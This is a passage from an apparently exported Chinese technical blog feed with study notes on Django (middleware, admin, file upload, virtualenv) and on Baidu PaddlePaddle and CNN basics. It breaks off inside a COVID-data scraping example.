class="line">    <span class="comment"># 产生request之后，匹配url路由之前调用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 调用视图函数之后，返回浏览器之前调用</span></span><br><span class="line">    <span class="comment"># view_func 为将要调用的视图函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response</span>):</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="comment"># 视图函数异常时候调用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>注意：如果在中间件的任意一个函数返回response，后续的过程将不会执行，而是直接将结果交给process_response，再返回浏览器。</p>
<h2 id="Django-Shell"><a href="#Django-Shell" class="headerlink" title="Django Shell"></a>Django Shell</h2><p>就是带Django相关功能的Python Shell。可以方便开发者调试代码。<br>例如，使用Django Shell添加一条数据库的记录。首先进入Shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py shell</span><br></pre></td></tr></table></figure>

<p>进入后，可以执行如下常用操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> my_app.models <span class="keyword">import</span> AuthorModel, MyBookModel</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取作者A的所有书 的 第0本，注意要所有字母小写</span></span><br><span class="line"><span class="built_in">print</span>(a.mybookmodel_set.<span class="built_in">all</span>()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h2 id="Django-Admin-模块"><a href="#Django-Admin-模块" class="headerlink" title="Django Admin 模块"></a>Django Admin 模块</h2><p>Django标配的后台管理工具，使用方便，可以快速编辑很多内容。</p>
<p>首先创建用户：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>
<p>填写用户名与密码，这里可能要求密码长度大于8位且不能为纯数字。</p>
<p>之后运行查看效果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py runserver 8080</span><br></pre></td></tr></table></figure>

<p><a href="http://127.0.0.1:8080/admin/">http://127.0.0.1:8080/admin/</a></p>
<p>进入后台后，可以看到管理页面中出现 Groups 与 Users，编辑这两项添加用户与用户组。<br>如果想将my_app的模型MyModel也加入其中，可以到my_app下的admin.py中编辑：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> my_app.models <span class="keyword">import</span> MyBookModel, AuthorModel</span><br><span class="line">admin.site.register(MyBookModel)</span><br><span class="line">admin.site.register(AuthorModel)</span><br></pre></td></tr></table></figure>

<p>也可以使用自定义管理页面：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyBookModelAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    <span class="comment"># 浏览页</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示的字段，方法</span></span><br><span class="line">    list_display = [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;title_func&#x27;</span>]</span><br><span class="line">    <span class="comment"># 如果想让传过来的方法也可以排序，要做模型里面添加</span></span><br><span class="line">    <span class="comment"># title_func.admin_order_field = &#x27;title&#x27;</span></span><br><span class="line">    <span class="comment"># 如果想改变显示内容</span></span><br><span class="line">    <span class="comment"># title_func.short_description = &#x27;T&#x27;</span></span><br><span class="line">    <span class="comment"># 如果想改变字段的显示内容</span></span><br><span class="line">    <span class="comment"># title = models.CharField(verbose_name=&#x27;T&#x27;, max_length=20)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每一页显示多少条</span></span><br><span class="line">    list_per_page = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 动作</span></span><br><span class="line">    actions_on_bottom = <span class="literal">True</span></span><br><span class="line">    actions_on_top = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 过滤栏</span></span><br><span class="line">    list_filter = [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>  <span class="comment"># 列表页右侧的过滤栏</span></span><br><span class="line">    ] </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索框</span></span><br><span class="line">    search_fields = [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>  <span class="comment"># 列表页上方的搜索框</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 编辑页</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字段显示顺序</span></span><br><span class="line">    fields = [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分组显示</span></span><br><span class="line">    fieldsets = [</span><br><span class="line">        (<span class="string">&#x27;Base&#x27;</span>, &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]&#125;),</span><br><span class="line">        (<span class="string">&#x27;Advance&#x27;</span>, &#123;<span class="string">&#x27;fields&#x27;</span>: []&#125;)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关联对象</span></span><br><span class="line">    inlines = [</span><br><span class="line">        AreaStackedInline,</span><br><span class="line">        AreaTabularInline</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 块状</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AreaStackedInline</span>(admin.StackedInline):</span><br><span class="line">    <span class="comment"># 写多类的名字</span></span><br><span class="line">    model = AreaInfo</span><br><span class="line">    extra = <span class="number">2</span>  <span class="comment"># 额外新建编辑2个子对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表状</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AreaTabularInline</span>(admin.TabularInline):</span><br><span class="line">    <span class="comment"># 写多类的名字</span></span><br><span class="line">    model = AreaInfo</span><br><span class="line">    extra = <span class="number">2</span>  <span class="comment"># 额外新建编辑2个子对象</span></span><br><span class="line"></span><br><span class="line">admin.site.register(MyBookModel, MyBookModelAdmin)</span><br><span class="line">admin.site.register(AuthorModel)</span><br></pre></td></tr></table></figure>

<p>如果要重写模板，可以在templates下建立<code>base_site.html</code>文件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &quot;admin/base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;# 标题 #&#125;</span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">&#123;&#123; title &#125;&#125; | &#123;&#123; site_title|default:_(&#x27;Django site admin&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;# 展框 #&#125;</span><br><span class="line">&#123;% block branding %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;site-name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;admin:index&#x27; %&#125;&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123; site_header|default:_(&#x27;Django administrator&#x27;) &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;# 导航栏 #&#125;</span><br><span class="line">&#123;% block nav-global %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Django-上传"><a href="#Django-上传" class="headerlink" title="Django 上传"></a>Django 上传</h2><p>配置settings.py文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MEDIA_URL = <span class="string">&#x27;/static/media&#x27;</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">&#x27;my_app/static/media&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>模板上，上传图片的表单配置如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/my_app/upload_action&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pic&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload file&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>视图中，获取文件并保存：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">upload_handle</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 如果是小文件（&lt;2.5MB），则文件存储在内存中；如果是大文件（&gt;2.5MB），则文件存储在临时文件中。</span></span><br><span class="line">    image = request.FILES[<span class="string">&#x27;pic&#x27;</span>]</span><br><span class="line">    <span class="comment"># image.name：文件名</span></span><br><span class="line">    <span class="comment"># image.chunks()：返回一个列表，里面存储文件的每一个区块</span></span><br><span class="line">    <span class="comment"># image.size：文件大小</span></span><br><span class="line">    <span class="comment"># image.content_type：文件类型，但是不确定</span></span><br><span class="line">    <span class="comment"># 创建一个文件</span></span><br><span class="line">    save_path = <span class="string">&#x27;%s/my_book_model/%s&#x27;</span>%(settings.MEDIA_ROOT, image.name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chk <span class="keyword">in</span> image.chunks():</span><br><span class="line">            f.write(chk)</span><br><span class="line">    <span class="comment"># 将路径保存至数据库中</span></span><br><span class="line">    m = MyBookModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">    m.picture = <span class="string">&#x27;my_book_model/%s&#x27;</span>%image.name</span><br><span class="line">    m.save()</span><br></pre></td></tr></table></figure>

<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><h3 id="Django-channels"><a href="#Django-channels" class="headerlink" title="Django-channels"></a>Django-channels</h3><h2 id="开发流程总结"><a href="#开发流程总结" class="headerlink" title="开发流程总结"></a>开发流程总结</h2><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><h3 id="网站设计"><a href="#网站设计" class="headerlink" title="网站设计"></a>网站设计</h3><h4 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h4><h4 id="URL设计"><a href="#URL设计" class="headerlink" title="URL设计"></a>URL设计</h4><table>
<thead>
<tr>
<th>URL</th>
<th>视图</th>
<th>模板文件</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;login</td>
<td>login</td>
<td>login.html</td>
</tr>
</tbody></table>
<h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><h3 id="模型编辑"><a href="#模型编辑" class="headerlink" title="模型编辑"></a>模型编辑</h3><h3 id="视图编辑"><a href="#视图编辑" class="headerlink" title="视图编辑"></a>视图编辑</h3><h3 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h3><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="虚环境"><a href="#虚环境" class="headerlink" title="虚环境"></a>虚环境</h3><h4 id="虚环境的安装"><a href="#虚环境的安装" class="headerlink" title="虚环境的安装"></a>虚环境的安装</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pip install virtualenv           <span class="comment"># 虚环境</span></span><br><span class="line">sudo pip install virtualenvwrapper    <span class="comment"># 虚环境扩展</span></span><br></pre></td></tr></table></figure>

<h4 id="虚环境的常用命令"><a href="#虚环境的常用命令" class="headerlink" title="虚环境的常用命令"></a>虚环境的常用命令</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkvirtualenv -p python3 name  <span class="comment"># 创建虚环境</span></span><br><span class="line">deactivate                    <span class="comment"># 退出虚环境</span></span><br><span class="line">workon name                   <span class="comment"># 进入虚环境</span></span><br><span class="line">rmvirtualenv name             <span class="comment"># 删除虚环境</span></span><br></pre></td></tr></table></figure>

<p>CMD下进入虚环境：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./venv/Scripts/activate.bat</span><br></pre></td></tr></table></figure>

<p>PowerShell下进入虚环境：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先开启脚本运行权限（管理员模式）</span></span><br><span class="line">Set-ExecutionPolicy RemoteSigned</span><br><span class="line"><span class="comment"># 开启脚本</span></span><br><span class="line">./venv/Scripts/activate.psl</span><br></pre></td></tr></table></figure>

<h4 id="查看虚环境下已安装的包"><a href="#查看虚环境下已安装的包" class="headerlink" title="查看虚环境下已安装的包"></a>查看虚环境下已安装的包</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip list                      <span class="comment"># 列出所有的包</span></span><br><span class="line">pip freeze &gt; requirements.txt <span class="comment"># 输出安装的包（到文件）</span></span><br></pre></td></tr></table></figure>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>开启日志文件，需要修改mysql.conf文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 实时查看日志文件</span><br><span class="line">tail -f mysql.log</span><br></pre></td></tr></table></figure>

<h3 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h3><p>pyecharts<br>xlrd Excel 操作</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Django</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>百度 PaddlePaddle</title>
    <url>/2020/03/29/Python/Paddle/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="传统图像识别"><a href="#传统图像识别" class="headerlink" title="传统图像识别"></a>传统图像识别</h2><p>语义鸿沟：</p>
<ul>
<li>相似的视觉特征，不同的语义概念。</li>
<li>不同的视觉特征，相同的语义概念。</li>
</ul>
<p>传统识别方法：测量空间 – 特征表示 – 特征空间 – 特征匹配 – 类别空间</p>
<p>早期识别技术：采集图像，采集特征，相似度计算。<br>采用全局特征提取：颜色，形状，纹理。<br>特征变换：提高特征表示性能，降维。Manifold Learning&#x2F;embedding：映射为低维空间下的向量表示，PCA MDS ISOMAP LLE Laplacian Eigenmap等。<br>索引技术：穷举搜索（效率低），临近搜索（牺牲精度）。KD-Tree LSH。二进制哈希，通过哈希编码特征，快速查找（减少特征存储空间，计算复杂度）。<br>相关反馈：通过用户反馈学习调整。Explicit Feedback（正负反馈），Implicit Feedback（根据可观察的行为推断用户意图）。<br>重排序：将接近的结果放到前面。<br>主要问题：全局特征丢失了图像细节。</p>
<p>中期图形识别：文本，词袋模型，倒排索引。图像，视觉词袋。<br>特征提取，生成视觉词典，词袋向量，倒排索引，特征提取，查询。<br>特征提取：局部特征，图像区块向量，特征检测子Harris Dog SURF HarrisAffine，特征描述子Sift glof shape context orb。<br>向量化：视觉词典生成。用特征向量，聚类（k means，affinity，propagation），找类中心，就是视觉关键词。每个图像可以找到多个视觉关键词直方图，直方图维度&#x3D;聚类中心的个数，维度值&#x3D;图像落在聚类中心的特征数量。<br>索引技术：倒排索引。提取局部描述，在索引中查找关键词。然后排序（tf-idf），对相似的图像投票。<br>后处理：局部几何验证，弱空间关系验证，乘积量化。提高一致性高的匹配结果，降低一致性低的匹配结果。</p>
<h2 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h2><p>时期：会推理 – 拥有知识 – 会学习 – 统计学习和神经网络</p>
<p>机器学习：对某个任务T可以从经验E中学习，经过经验E改进，使得任务T的性能有所提升。</p>
<p>一般过程：训练数据，测试数据，训练结果（策略，模型，算法），求函数F的过程。</p>
<p>深度学习：学习人的神经网络，解决机器学习问题。<br>优势：在特征空间中，由人提取特征变为由深度学习提取。</p>
<h2 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h2><p>滤波器提取：像素，边缘，特征。<br>图像识别：建立模型，损失函数（误差最小），参数学习。<br>建立模型：选择什么样的网络结构，多少层，每层多少神经元。</p>
<ul>
<li>线性函数：f&#x3D;wa+b，</li>
<li>激活函数（非线性）<br>损失函数：选择常用的损失函数，平方误差，交叉熵<br>参数学习：梯度下降法，反向传播</li>
</ul>
<p>模型：</p>
<ul>
<li>前馈神经网络：多隐藏层（多少层，多少结点），输出层（激活函数：softmax，概率）</li>
</ul>
<p>分类任务要最后接全连接层。</p>
<h2 id="卷积网络"><a href="#卷积网络" class="headerlink" title="卷积网络"></a>卷积网络</h2><p>传统全连接结构不够灵活，参数量巨大，不适合二维图形。采用卷积网络，前后层部分连接，权值共享，下采样。卷积网络，就是学习滤波器的值。</p>
<p>建立模型：局部连接，权值共享，下采样。为了减少参数。<br>局部连接：采用卷积核对图形（上一层）卷积，得到卷积后的结果（下一层）。<br>权值共享：卷积核的参数固定，为w1到wn。<br>下采样：缩小宽和高，常用最大值或平均值。</p>
<p>卷积计算后，图像会缩小，新尺寸为：w-c+1<br>卷积层：input_image * kernel &#x3D; feature_map<br>一个卷积层可以有多个卷积核，一个图像产生多个特征图。</p>
<p>经典结构：LeNet-5</p>
<p>损失函数：<br>目标分类与检测：图像经过卷积池化，再经过卷积提取特征图，之后经过全连接网络。分类损失（交叉熵损失函数），回归损失（平方损失函数）。</p>
<p>一般结构示例：<code>((卷积层+激活层)*2+池化层)*3+全连接层*3</code><br>计算机视觉的几种任务：图像分类（为图像赋予语义标签），目标检测（把物体位置标注出来），图像语义分割（精确勾勒出其轮廓和位置），图像实例分割（多物体时，将他们区分出来）</p>
<p>数据集：</p>
<ul>
<li><a href="http://www.cs.toronto.edu/~kriz/cifar.html">Cifar-10</a>：比MNIST更高级的数据集，彩色的，50000训练+10000测试图片，几十种类别。</li>
<li><a href="http://image-net.org/">ImageNet</a>：强大的数据集，1281167训练+50000验证+100000测试（不对外公布），1000多个类别。</li>
</ul>
<p>经典CNN：Hubel&amp;Wiesel -&gt; LeNet -&gt; AlexNet -&gt; NIN,GoogleNet,InceptionV3,V4 &amp; VGG &amp; InceptionV2,BN -&gt; ResetNet<br>LeNet：使用MNIST数据集，早期用于数字识别。只接受32*32大小图像。<br>AlexNet：加入激活层。后来被ZF Net改进。接受<code>227*227*3</code>图像大小。卷积核<code>11*11</code>，每一层输出：(图像尺寸-卷积核尺寸)&#x2F;步长+1，如果有padding边界延拓再修改大小。经过几轮，加一个池化，再经过几次，进入全连接。在训练过程中，使用了一些技巧：分组卷积，使用激活函数ReLU（解决梯度消失），DataAugmentation（<a href="https://github.com/aleju/imgaug">数据增强</a>，给图像产生噪声，形变，翻转，裁剪，防止过拟合），DropOut（解决过拟合0.5），BatchSize（批训练128），SGD-Momentum（随机梯度下降0.9），LearningRate（学习率0.01），L2 Weight-Dccay（5e-4）<br>NIN,GoogleNet,InceptionV3,V4：<br>VGG：<br>InceptionV2,BN：<br>ResetNet：</p>
<h2 id="PaddlePaddle-安装"><a href="#PaddlePaddle-安装" class="headerlink" title="PaddlePaddle 安装"></a>PaddlePaddle 安装</h2><p><a href="https://www.paddlepaddle.org.cn/install/quick">快速安装教程</a></p>
<p>支持Windows，MacOS，Ubuntu，CentOS。<br>支持Pip，Docker等。<br>支持CUDA 9，10，CPU版本。</p>
<p>例如：<br>Windows + pip + Python 3 + CUDA 10 + cuDNN 7.3+</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -m pip install paddlepaddle-gpu==1.7.1.post107 -i https://mirror.baidu.com/pypi/simple</span><br></pre></td></tr></table></figure>

<p>安装验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paddle.fluid</span><br><span class="line"><span class="built_in">print</span>(paddle.fluid.install_check.run_check())</span><br></pre></td></tr></table></figure>

<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>目前支持的基本数据类型有：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">float16 <span class="comment"># 部分操作支持</span></span><br><span class="line">float32 <span class="comment"># 主要实数类型</span></span><br><span class="line">float64 <span class="comment"># 次要实数类型，支持大部分操作</span></span><br><span class="line">int32   <span class="comment"># 次要标签类型</span></span><br><span class="line">int64   <span class="comment"># 主要标签类型</span></span><br><span class="line">uint64  <span class="comment"># 次要标签类型</span></span><br><span class="line"><span class="built_in">bool</span>    <span class="comment"># 控制流数据类型</span></span><br><span class="line">int16   <span class="comment"># 次要标签类型</span></span><br><span class="line">uint8   <span class="comment"># 输入数据类型，可用于图像像素</span></span><br></pre></td></tr></table></figure>

<h3 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h3><p>一般可以认为Variable等价于Tensor。<br>Variable可分为三种：</p>
<p>模型中的可学习参数：网络权重，偏置等</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建可学习参数</span></span><br><span class="line">w = fluid.layers.create_parameter(name=<span class="string">&quot;w&quot;</span>,shape=[<span class="number">1</span>],dtype=<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line"><span class="comment"># 一部分常见的神经网络基本计算模块被提供了封装。例如全连接模型中创建 权值，偏置 两个可学习参数：</span></span><br><span class="line">y = fluid.layers.fc(<span class="built_in">input</span>=x, size=<span class="number">128</span>, bias_attr=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>占位Variable：表示待提供输入的Variable</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义x的维度为[3,None]，其中我们只能确定x的第一的维度为3，第二个维度未知，要在程序执行过程中才能确定</span></span><br><span class="line">x = fluid.data(name=<span class="string">&quot;x&quot;</span>, shape=[<span class="number">3</span>,<span class="literal">None</span>], dtype=<span class="string">&quot;int64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#若图片的宽度和高度在运行时可变，将宽度和高度定义为None。</span></span><br><span class="line"><span class="comment">#shape的三个维度含义分别是：batch_size, channel、图片的宽度、图片的高度</span></span><br><span class="line">b = fluid.data(name=<span class="string">&quot;image&quot;</span>,shape=[<span class="literal">None</span>, <span class="number">3</span>,<span class="literal">None</span>,<span class="literal">None</span>],dtype=<span class="string">&quot;float32&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>常量Variable：常量</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data = fluid.layers.fill_constant(shape=[<span class="number">1</span>], value=<span class="number">0</span>, dtype=<span class="string">&#x27;int64&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Tensor数据"><a href="#Tensor数据" class="headerlink" title="Tensor数据"></a>Tensor数据</h3><p>对于一些batch内样本大小不一样的问题（有的大有的小），Paddle可以通过两种方式解决：</p>
<ul>
<li>Padding：修改到同样大小（推荐）</li>
<li>Lod-Tensor：记录每个样本的大小，以便减少无用的计算量。如果前一个方法不可行，可以用这种方法。</li>
</ul>
<h3 id="LoD-Tensor"><a href="#LoD-Tensor" class="headerlink" title="LoD Tensor"></a>LoD Tensor</h3><p>Level of Detail Tensor 是Paddle的高级特性，是对Tensor的一种扩充。大部分情况下可以不必关注。</p>
<h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><p>这里囊括所有对数据的操作，可以到以下模块中使用。但是Operator并不是实时的，而仅仅是提交操作，等待最后统一计算：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paddle.fluid.layers</span><br><span class="line"><span class="keyword">import</span> paddle.fluid.nets</span><br></pre></td></tr></table></figure>

<p>加法运算：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义执行器</span></span><br><span class="line">cpu = fluid.core.CPUPlace()</span><br><span class="line">exe = fluid.Executor(cpu)</span><br><span class="line">exe.run(fluid.default_startup_program())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Tensor和运算</span></span><br><span class="line">a = fluid.data(name=<span class="string">&quot;a&quot;</span>,shape=[<span class="number">1</span>],dtype=<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">b = fluid.data(name=<span class="string">&quot;b&quot;</span>,shape=[<span class="number">1</span>],dtype=<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">result = fluid.layers.elementwise_add(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Numpy 数据</span></span><br><span class="line">x = numpy.array([<span class="number">5</span>]).astype(<span class="string">&quot;float32&quot;</span>)</span><br><span class="line">y = numpy.array([<span class="number">7</span>]).astype(<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交数据并运行，fetch_list 为希望查看的变量</span></span><br><span class="line">outs = exe.run(</span><br><span class="line">        feed=&#123;<span class="string">&#x27;a&#x27;</span>:x,<span class="string">&#x27;b&#x27;</span>:y&#125;,</span><br><span class="line">        fetch_list=[result])</span><br></pre></td></tr></table></figure>

<h3 id="Program"><a href="#Program" class="headerlink" title="Program"></a>Program</h3><p>用于描述整个计算过程。Operator会被按顺序放入Program中。一般有这几种<a href="https://www.paddlepaddle.org.cn/documentation/docs/api_guides/low_level/layers/control_flow.html">结构</a>：</p>
<ul>
<li>顺序结构</li>
<li>条件分支</li>
<li>循环</li>
<li>动态 RNN</li>
<li>静态 RNN</li>
</ul>
<p>用户完成网络定义后，一段 Paddle 程序中通常存在 2 个 Program。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义模型参数初始化等操作，可以由框架自动生成，使用时无需显式地创建。如果调用修改了参数的默认初始化方式，框架会自动的将相关的修改加入default_startup_program</span></span><br><span class="line">fluid.default_startup_program</span><br><span class="line"><span class="comment"># 定义神经网络模型，前向反向计算，参数更新等操作，构建这个也是用户的主要任务</span></span><br><span class="line">fluid.default_main_program</span><br></pre></td></tr></table></figure>

<h3 id="Executor"><a href="#Executor" class="headerlink" title="Executor"></a>Executor</h3><p>该部分相当于对Program的编译和执行。Executor将Program转换为C++后端的可执行程序<code>FluidProgram</code>，完成编译操作；Executor再执行编译好的<code>FluidProgram</code>程序。</p>
<h3 id="动态图机制"><a href="#动态图机制" class="headerlink" title="动态图机制"></a>动态图机制</h3><p>可以通过这个机制，无需构建整个图，就可以立即执行结果。这个机制能够方便用户及时调试模型，减少大量用于构建静态图的代码。</p>
<p>使用这一机制，需要在guard上下文环境下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.ones([<span class="number">2</span>, <span class="number">2</span>], np.float32)</span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    <span class="comment"># 编辑动态图代码</span></span><br><span class="line">    inputs = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        inputs.append(fluid.dygraph.to_variable(x)) <span class="comment"># ndarray 转 Variable</span></span><br><span class="line">    ret = fluid.layers.sums(inputs)</span><br><span class="line">    <span class="built_in">print</span>(ret.numpy())</span><br><span class="line">    <span class="comment"># 反向计算</span></span><br><span class="line">    loss = fluid.layers.reduce_sum(ret)</span><br><span class="line">    loss.backward()</span><br><span class="line">    <span class="built_in">print</span>(loss.gradient())</span><br></pre></td></tr></table></figure>

<h2 id="疫情数据可视化（爬虫，Pyecharts）"><a href="#疫情数据可视化（爬虫，Pyecharts）" class="headerlink" title="疫情数据可视化（爬虫，Pyecharts）"></a>疫情数据可视化（爬虫，Pyecharts）</h2><h3 id="爬取数据"><a href="#爬取数据" class="headerlink" title="爬取数据"></a>爬取数据</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">today = datetime.date.today().strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)   <span class="comment">#20200315</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crawl_dxy_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    爬取丁香园实时统计数据，保存到data目录下，以当前日期作为文件名，存JSON文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://ncov.dxy.cn/ncovh5/view/pneumonia&#x27;</span>) <span class="comment">#request.get()用于请求目标网站</span></span><br><span class="line">    <span 